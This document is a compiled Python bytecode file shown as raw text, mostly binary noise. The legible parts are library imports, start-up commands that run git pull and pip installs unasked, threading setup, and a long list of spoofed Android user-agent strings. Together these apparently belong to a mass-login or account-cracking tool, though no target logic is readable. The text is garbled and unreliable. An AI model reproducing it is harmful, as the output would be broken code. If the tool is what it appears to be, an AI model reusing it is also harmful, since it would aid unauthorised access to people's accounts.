�

    ��zc�  �            

       ��  � d Z dZdZdZdZdZdZdZdd	lZ ej	        d

�  �         	 dd	l

Z

n# e$ r  ej	        d�  �         Y nw xY w	 dd	lZnG# e$ r?  ej	        d�  �          e

j        d

�  �         	 dd	lZn# e$ r  ed�  �         Y nw xY wY nw xY w	 dd	lZn# e$ r  ej	        d�  �         Y nw xY w	 dd	lZn# e$ r  ej	        d�  �         Y nw xY wdd	lZdd	lZdd	l

Z

dd	l

Z

dd	lZdd	lZdd	lZdd	lZddlmZ dd	l

Z

dd	lZdd	lZdd	lZdd	lZdd	lZdd	lZdd	lZdd	l

Z

dd	lZdd	lZddlmZ ddl m!Z" ddlm#Z$ ddlmZ% ddl m&Z' ddl(m)Z* dd	lZddlm+Z, ddl-m.Z/ ddl0m1Z2 ddl3m4Z4 	  ej	        d�  �         n#  Y nxY wddgZ5g d�Z6g g dg g g g g g g g f\  Z7Z8a9Z:Z;Z<Z=Z>Z?Z@ZAdaBg aC	  ejD        d�  �         n#  Y nxY wdZEd ZFd!ZGd"ZHd#ZId#ZJd$ZKd%ZLd&ZMd'd(d)d*d+d,d-d.d/d0d1d2d3�ZNd'd(d)d*d+d,d-d.d/d0d1d2d4�ZOej        �P                    �   �         jQ        ZReN eSej        �P                    �   �         jT        �  �                 ZUej        �P                    �   �         jV        ZWd5 eSeR�  �        z   d6z    eSeU�  �        z   d6z    eSeW�  �        z   d7z   ZXd5 eSeR�  �        z   d6z    eSeU�  �        z   d6z    eSeW�  �        z   d8z   ZY eZeYd9�  �          eZeXd9�  �         d:� Z[d;� Z\d<Z]d=Z^d>� Z_d?� Z`d@� ZadA� ZbdB� ZcdC� ZddD� Ze e_�   �          d	S )Ez[97;1mz[91;1mz[92;1mz[93;1mz[94;1mz[95;1mz[96;1mz[0m�    Nzgit pullzpip install requestszpip install rich�   z1Execute [pip install rich] to Install rich Modulezpip install futureszpip install bs4)�ThreadPoolExecutor)�Table)�Console)�

BeautifulSoup)�Group)�Panel)�print)�Markdown)�Columns)�quotez

mkdir SAVEz6Mozilla/5.0 (Android 2.2; id-id; HTC Desire)/GoBrowser(

  z�Mozilla/5.0 (Linux; Android 11; SAMSUNG SM-P610) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/13.0 Chrome/83.0.4103.106 Safari/537.36zzMozilla/5.0 (Linux; Android 11; SAMSUNG SM-P610) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Safari/537.36z�Mozilla/5.0 (Linux; Android 11; SAMSUNG SM-N975U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Mobile Safari/537.36z�Mozilla/5.0 (Linux; Android 11; SAMSUNG SM-N971N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Mobile Safari/537.36z�Mozilla/5.0 (Linux; Android 11; SAMSUNG SM-N970U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Mobile Safari/537.36u    Mozilla/5.0 (Linux; Android 1…z�[18.36, 15/3/2022] AOREC: Mozilla/5.0 (Linux; Android 11; en-au; SAMSUNG SM-N975F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.141 Mobile Safari/537.36z~Mozilla/5.0 (Linux; Android 11; en-au; SCV45) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Mobile Safari/537.36z�Mozilla/5.0 (Linux; Android 11; en-au; en-au; SC-04L) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Mobile Safari/537.36z�Mozilla/5.0 (Linux; Android 11; en-au; SAMSUNG SM-N980F/N980FXXU1DUB5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Mobile Safari/537.36z�Mozilla/5.0 (Linux; Android 11; en-au; SAMSUNG SM-N971N/KSU1FUCD) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Mobile Safari/537.36z�Mozilla/5.0 (Linux; Android 11; en-au;  SAMSUNG SM-M625F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Mobile Safari/537.36z�Mozilla/5.0 (Linux; Android 11; en-au;  SAMSUNG SM-G988B/G988BXXU7DUC7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Mobile Safari/537.36z�Mozilla/5.0 (Linux; Android 11; en-au;  SAMSUNG SM-A8050) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Mobile Safari/537.36z�Mozilla/5.0 (Linux; Android 11; en-au; SAMSUNG IN2020) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Mobile Safari/537.36zMozilla/5.0 (Linux; Android 10; en-au; SC-42A) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Mobile Safari/537.36z�Mozilla/5.0 (Linux; Android 10; en-au; SAMSUNG SM-T597W) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Safari/537.36z�Mozilla/5.0 (Linux; Android 10; en-au; SAMSUNG SM-N960F/N960FXXS8FUC4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Mobile Safari/537.36z�Mozilla/5.0 (Linux; Android 10; en-au; SAMSUNG SM-G988U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Mobile Safari/537.36z�Mozilla/5.0 (Linux; Android 10; en-au; SAMSUNG SM-A600FN/A600FNXXU6CTF2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Mobile Safari/537.36z�Mozilla/5.0 (Linux; Android 10; en-au; SAMSUNG SM-A515F/A515FXXU2ATB1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Mobile Safari/537.36z�Mozilla/5.0 (Linux; Android 10; en-au; SAMSUNG SM-A505FN 6/128) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/13.2 Chrome/83.0.4103.106 Mobile Safari/537.36z�Mozilla/5.0 (Linux; Android 10; en-au; SAMSUNG SM-A105M) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Safari/537.36z�Mozilla/5.0 (Linux; Android 10; en-au; SAMSUNG SM-A013F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Mobile Safari/537.36z�Mozilla/5.0 (Linux; Android 9; en-au; SAMSUNG SM-N935S) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Mobile Safari/537.36z�Mozilla/5.0 (Linux; Android 9; en-au; SAMSUNG SM-M205G) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Mobile Safari/537.36z�Mozilla/5.0 (Linux; Android 9; en-au; SAMSUNG SM-J530GM) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Mobile Safari/537.36z�Mozilla/5.0 (Linux; Android 9; en-au; SAMSUNG SM-A530F/A530FXXU4CSC6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Mobile Safari/537.36z�Mozilla/5.0 (Linux; Android 8.1.0; en-au; SAMSUNG SM-T835) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Safari/537.36��Mozilla/5.0 (Linux; Android 8.0.0; en-au; SAMSUNG SM-G960F/G960FXXS2BRK3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Mobile Safari/537.36r   z�Mozilla/5.0 (Linux; Android 7.0; en-au; SAMSUNG SM-G935F/G935FXXS2DRAA) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Mobile Safari/537.36z�Mozilla/5.0 (Linux; Android 7.0; en-au; SAMSUNG SM-G920K/KKS3ETJ1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Mobile Safari/537.36z�Mozilla/5.0 (Linux; Android 6.0.1; en-au; SAMSUNG SM-C9000) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Mobile Safari/537.36��Mozilla/5.0 (Linux; Android 11; en-au; SAMSUNG SM-P610) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Safari/537.36r   z�Mozilla/5.0 (Linux; Android 11; en-au; SAMSUNG SM-N975U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Mobile Safari/537.36z�Mozilla/5.0 (Linux; Android 11; en-au; SAMSUNG SM-N971N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Mobile Safari/537.36z�Mozilla/5.0 (Linux; Android 11; en-au; SAMSUNG SM-N970U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Mobile Safari/537.36z�Mozilla/5.0 (Linux; Android 11; en-au; SAMSUNG SM-N770F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Mobile Safari/537.36��Mozilla/5.0 (Linux; Android 11; en-au; SAMSUNG SM-M317F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Mobile Safari/537.36r   z�Mozilla/5.0 (Linux; Android 11; en-au; SAMSUNG SM-M307FN) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Mobile Safari/537.36z�Mozilla/5.0 (Linux; Android 11; en-au; SAMSUNG SM-M307F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Mobile Safari/537.36z�Mozilla/5.0 (Linux; Android 11; en-au; SAMSUNG SM-G973U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Mobile Safari/537.36z�Mozilla/5.0 (Linux; Android 11; en-au; SAMSUNG SM-A716U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Mobile Safari/537.36z�Mozilla/5.0 (Linux; Android 11; en-au; SAMSUNG SM-A505FM) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Mobile Safari/537.36z�Mozilla/5.0 (Linux; Android 10; en-au; SAMSUNG SM-J720M) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Mobile Safari/537.36zyMozilla/5.0 (Linux; Android 10; en-au; Pixel C) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Safari/537.36zMozilla/5.0 (Linux; Android 10; en-au; NX659J) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Mobile Safari/537.36z�Mozilla/5.0 (Linux; Android 9; en-au; SAMSUNG SM-M107F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Mobile Safari/537.36z�Mozilla/5.0 (Linux; Android 9; en-au; SAMSUNG SM-A102U1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Mobile Safari/537.36z�Mozilla/5.0 (Linux; Android 8.0; en-au; SAMSUNG SM-G965F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Mobile Safari/537.36z�Mozilla/5.0 (Linux; Android 7.1.1; en-au; SAMSUNG SM-G550FY) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Mobile Safari/537.36z�Mozilla/5.0 (Linux; Android 7.0; en-au; SAMSUNG SM-N9200) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Mobile Safari/537.36z�Mozilla/5.0 (Linux; Android 7.0; en-au; FRD-L09) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Mobile Safari/537.36z�Mozilla/5.0 (Linux; Android 11; en-au; SAMSUNG SM-T870) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.136 Safari/537.36z�Mozilla/5.0 (Linux; Android 11; en-au; SAMSUNG SM-P615) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.136 Safari/537.36z�Mozilla/5.0 (Linux; Android 11; en-au; SAMSUNG SM-N985F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.136 Mobile Safari/537.36z�Mozilla/5.0 (Linux; Android 11; en-au; SAMSUNG SM-N975F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.136 Mobile Safari/537.36z�Mozilla/5.0 (Linux; Android 11; en-au; SAMSUNG SM-N971N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.136 Mobile Safari/537.36z�Mozilla/5.0 (Linux; Android 11; en-au; SAMSUNG SM-N970F/N970FXXS6EUA1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.136 Mobile Safari/537.36��Mozilla/5.0 (Linux; Android 11; en-au; SAMSUNG SM-N970F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.136 Mobile Safari/537.36z�Mozilla/5.0 (Linux; Android 11; en-au; SAMSUNG SM-N770F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.136 Mobile Safari/537.36z�Mozilla/5.0 (Linux; Android 11; en-au; SAMSUNG SM-M317F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.136 Mobile Safari/537.36��Mozilla/5.0 (Linux; Android 11; en-au; SAMSUNG SM-M315F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.136 Mobile Safari/537.36��Mozilla/5.0 (Linux; Android 11; en-au; SAMSUNG SM-M307F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.136 Mobile Safari/537.36z�Mozilla/5.0 (Linux; Android 11; en-au; SAMSUNG SM-G977N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.136 Mobile Safari/537.36z�Mozilla/5.0 (Linux; Android 11; en-au; SAMSUNG SM-G781B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.136 Mobile Safari/537.36z�Mozilla/5.0 (Linux; Android 11; en-au; SAMSUNG SM-F700F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.136 Mobile Safari/537.36z�Mozilla/5.0 (Linux; Android 11; en-au; CPH2009) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.136 Mobile Safari/537.36z�Mozilla/5.0 (Linux; Android 10; en-au; SAMSUNG SM-G980F/G980FXXU3ATFG) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.136 Mobile Safari/537.36z�Mozilla/5.0 (Linux; Android 10; en-au; SAMSUNG SM-G975F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.72 Mobile Safari/537.36z�Mozilla/5.0 (Linux; Android 10; en-au; SAMSUNG SM-G973F/G973FXXS3BSL4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.136 Mobile Safari/537.36z�Mozilla/5.0 (Linux; Android 10; en-au; SAMSUNG SM-G960F/G960FXXSDFTL1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.136 Mobile Safari/537.36z�Mozilla/5.0 (Linux; Android 10; en-au; SAMSUNG SM-A908N/KSU3CTL3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.136 Mobile Safari/537.36z�Mozilla/5.0 (Linux; Android 10; en-au; SAMSUNG SM-A505FN/A505FNXXS6BUA5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.136 Mobile Safari/537.36z�Mozilla/5.0 (Linux; Android 10; en-au; SAMSUNG SM-A426B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.136 Mobile Safari/537.36z�Mozilla/5.0 (Linux; Android 10; en-au; SAMSUNG SM-A217F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.99 Mobile Safari/537.36z�Mozilla/5.0 (Linux; Android 10; en-au; SAMSUNG SM-A015F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.90 Mobile Safari/537.36��Mozilla/5.0 (Linux; Android 8.1.0; en-au; SAMSUNG SM-J710F/J710FXXS6CTJ2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.136 Mobile Safari/537.36��Mozilla/5.0 (Linux; Android 8.1.0; en-au; SAMSUNG SM-J327R6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.136 Mobile Safari/537.36��Mozilla/5.0 (Linux; Android 8.0.0; en-au; SAMSUNG SM-J330FN/J330FNXXU3BRL1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.136 Mobile Safari/537.36z�Mozilla/5.0 (Linux; Android 8.0.0; en-au; SAMSUNG SM-A530F/A530FXXU3BRL8) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.136 Mobile Safari/537.36��Mozilla/5.0 (Linux; Android 8.0.0; en-au; SAMSUNG SM-A530F/A530FXXS3BRH1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.136 Mobile Safari/537.36��Mozilla/5.0 (Linux; Android 7.0; en-au; SAMSUNG SM-J327U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.136 Mobile Safari/537.36r   r   r   r   r   z�Mozilla/5.0 (Linux; Android 5.1.1; en-au; SAMSUNG SM-J320FN/J320FNXXU0ARE1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.136 Mobile Safari/537.36r   r   z�Mozilla/5.0 (Linux; Android 11 en-au;; SAMSUNG SM-M307FN) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.136 Mobile Safari/537.36r   z�Mozilla/5.0 (Linux; Android 11; en-au; SAMSUNG SM-G980F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.136 Mobile Safari/537.36z�Mozilla/5.0 (Linux; Android 11; en-au; SAMSUNG SM-G970F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.136 Mobile Safari/537.36z�Mozilla/5.0 (Linux; Android 11; en-au; SAMSUNG SM-A515F/A515FXXU4DUB2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.136 Mobile Safari/537.36z�Mozilla/5.0 (Linux; Android 11; en-au; SAMSUNG SM-A505F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.136 Mobile Safari/537.36z�Mozilla/5.0 (Linux; Android 10; en-au; SAMSUNG SM-T725) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.136 Mobile Safari/537.36z�Mozilla/5.0 (Linux; Android 10; en-au; SAMSUNG SM-S111DL) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.136 Mobile Safari/537.36z�Mozilla/5.0 (Linux; Android 10; en-au; SAMSUNG SM-M105G) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.136 Mobile Safari/537.36z�Mozilla/5.0 (Linux; Android 10; en-au; SAMSUNG SM-J610G) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.136 Mobile Safari/537.36z�Mozilla/5.0 (Linux; Android 10; en-au; SAMSUNG SM-J610FN) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.136 Mobile Safari/537.36z�Mozilla/5.0 (Linux; Android 10; en-au; SAMSUNG SM-J400M) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.136 Mobile Safari/537.36z�Mozilla/5.0 (Linux; Android 10; en-au; SAMSUNG SM-G965N/KSU3FTJ2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.136 Mobile Safari/537.36z�Mozilla/5.0 (Linux; Android 10; en-au; SAMSUNG SM-F700U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.136 Mobile Safari/537.36z�Mozilla/5.0 (Linux; Android 10; en-au; SAMSUNG SM-A202F/A202FXXS3BTI2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.136 Mobile Safari/537.36z�Mozilla/5.0 (Linux; Android 10; en-au; SAMSUNG SM-A115M) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.136 Mobile Safari/537.36z�Mozilla/5.0 (Linux; Android 10; en-au; SAMSUNG SM-A105FN/A105FNXXS4BTG1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.136 Mobile Safari/537.36z�Mozilla/5.0 (Linux; Android 9; en-au; SAMSUNG SM-T827V) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.136 Safari/537.36z�Mozilla/5.0 (Linux; Android 9; en-au; SAMSUNG SM-J260A) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.136 Mobile Safari/537.36z�Mozilla/5.0 (Linux; Android 9; en-au; SAMSUNG SM-A307GT) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.136 Mobile Safari/537.36z�Mozilla/5.0 (Linux; Android 9; en-au; SAMSUNG SM-A107F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.136 Mobile Safari/537.36z�Mozilla/5.0 (Linux; Android 8.1.0; en-au; SAMSUNG SM-T585/T585XXS5CSH1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.136 Safari/537.36z�Mozilla/5.0 (Linux; Android 8.1.0; en-au; SAMSUNG SM-J610F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.136 Mobile Safari/537.36z�Mozilla/5.0 (Linux; Android 7.0; en-au; SAMSUNG SM-G925K/KKU3ERG1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.136 Mobile Safari/537.36z�Mozilla/5.0 (Linux; Android 5.0.2; en-au; SAMSUNG SM-P905) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.136 Safari/537.36z�Mozilla/5.0 (Linux; Android 11; en-au; SAMSUNG SM-M515F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.143 Mobile Safari/537.36z�Mozilla/5.0 (Linux; Android 11; en-au; SAMSUNG SM-M317F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.143 Mobile Safari/537.36��Mozilla/5.0 (Linux; Android 11; en-au; SAMSUNG SM-M315F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.143 Mobile Safari/537.36z�Mozilla/5.0 (Linux; Android 11; en-au; SAMSUNG SM-M215F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.143 Mobile Safari/537.36z�Mozilla/5.0 (Linux; Android 11; en-au; SAMSUNG SM-G985F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.143 Mobile Safari/537.36z�Mozilla/5.0 (Linux; Android 11; en-au; SAMSUNG SM-A515F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.143 Mobile Safari/537.36z�Mozilla/5.0 (Linux; Android 11; en-au; SAMSUNG SM-A505GN) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.143 Mobile Safari/537.36z�Mozilla/5.0 (Linux; Android 10; en-au; SAMSUNG SM-T505) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.143 Safari/537.36z�Mozilla/5.0 (Linux; Android 10; en-au; SAMSUNG SM-T307U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.143 Safari/537.36z�Mozilla/5.0 (Linux; Android 10; en-au; SAMSUNG SM-M317F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.143 Mobile Safari/537.36z�Mozilla/5.0 (Linux; Android 10; en-au; SAMSUNG SM-M307FN) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.143 Mobile Safari/537.36z�Mozilla/5.0 (Linux; Android 10; en-au; SAMSUNG SM-J400F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.143 Mobile Safari/537.36z�Mozilla/5.0 (Linux; Android 10; en-au; SAMSUNG SM-A405FN/A405FNXXS3BTI3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.143 Mobile Safari/537.36z�Mozilla/5.0 (Linux; Android 10; en-au; SAMSUNG SM-A207F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.93 Mobile Safari/537.36z�Mozilla/5.0 (Linux; Android 9; en-au; SAMSUNG SM-J810F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.72 Mobile Safari/537.36z�Mozilla/5.0 (Linux; Android 9; en-au; SAMSUNG SM-J330FN/J330FNXXU4CTH2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.143 Mobile Safari/537.36z�Mozilla/5.0 (Linux; Android 9; en-au; SAMSUNG SM-G950F/G950FXXSBDUA3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.143 Mobile Safari/537.36z�Mozilla/5.0 (Linux; Android 9; en-au; SAMSUNG SM-A605FN) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.93 Mobile Safari/537.36z�Mozilla/5.0 (Linux; Android 8.1.0; en-au; SAMSUNG SM-M105F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.143 Mobile Safari/537.36z�Mozilla/5.0 (Linux; Android 8.0.0; en-au; SAMSUNG SM-G960W) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.143 Mobile Safari/537.36z�Mozilla/5.0 (Linux; Android 8.0.0; en-au; SAMSUNG SM-A520F/A520FXXUGCTI9) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.143 Mobile Safari/537.36z�Mozilla/5.0 (Linux; Android 7.0; en-au; SAMSUNG SM-G935W8) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.143 Mobile Safari/537.36z�Mozilla/5.0 (Linux; Android 7.0; en-au; SAMSUNG SM-C7000) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.143 Mobile Safari/537.36z�Mozilla/5.0 (Linux; Android 7.0; en-au; SAMSUNG SM-A310F/A310FXXS5CTK1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.143 Mobile Safari/537.36z�Mozilla/5.0 (Linux; Android 6.0.1; en-au; SAMSUNG SM-T805M) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.143 Safari/537.36z�Mozilla/5.0 (Linux; Android 6.0.1; en-au; SAMSUNG SM-G900F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.75 Mobile Safari/537.36z�Mozilla/5.0 (Linux; Android 11; en-au;SAMSUNG SM-N9750) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.143 Mobile Safari/537.36z�Mozilla/5.0 (Linux; Android 11; en-au;SAMSUNG SM-N975F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.143 Mobile Safari/537.36��Mozilla/5.0 (Linux; Android 11; en-au; SAMSUNG SM-G988B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.143 Mobile Safari/537.36��Mozilla/5.0 (Linux; Android 11; en-au; SAMSUNG SM-G973F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.143 Mobile Safari/537.36��Mozilla/5.0 (Linux; Android 11; en-au; SAMSUNG SM-A405FN) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.143 Mobile Safari/537.36z�Mozilla/5.0 (Linux; Android 11; en-au; SAMSUNG SM-N975F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.143 Mobile Safari/537.36r   r   r   z�Mozilla/5.0 (Linux; Android 10; en-au; SAMSUNG SM-T295) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.143 Safari/537.36z�Mozilla/5.0 (Linux; Android 10; en-au; SAMSUNG SM-T290) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.143 Safari/537.36z�Mozilla/5.0 (Linux; Android 10; en-au; SAMSUNG SM-M205F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.143 Mobile Safari/537.36z�Mozilla/5.0 (Linux; Android 10; en-au; SAMSUNG SM-J600GT) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.143 Mobile Safari/537.36z�Mozilla/5.0 (Linux; Android 10; en-au; SAMSUNG SM-G398FN) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.143 Mobile Safari/537.36z�Mozilla/5.0 (Linux; Android 10; en-au; SAMSUNG SM-A600G) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.143 Mobile Safari/537.36z�Mozilla/5.0 (Linux; Android 10; en-au; SAMSUNG SM-A505FN/A505FNXXS5BTI9) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.143 Mobile Safari/537.36z�Mozilla/5.0 (Linux; Android 10; en-au; SAMSUNG SM-A205FN) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.143 Mobile Safari/537.36z�Mozilla/5.0 (Linux; Android 10; en-au; SAMSUNG SM-A202F/A202FXXU3BTK2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.143 Mobile Safari/537.36z�Mozilla/5.0 (Linux; Android 10; en-au; SAMSUNG SM-A105FN/A105FNXXU4BTI2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.143 Mobile Safari/537.36z�Mozilla/5.0 (Linux; Android 10; en-au; SAMSUNG SM-A105F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.143 Mobile Safari/537.36z�Mozilla/5.0 (Linux; Android 9; en-au; SAMSUNG SM-G955F/G955FXXU9DTF1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.143 Mobile Safari/537.36z�Mozilla/5.0 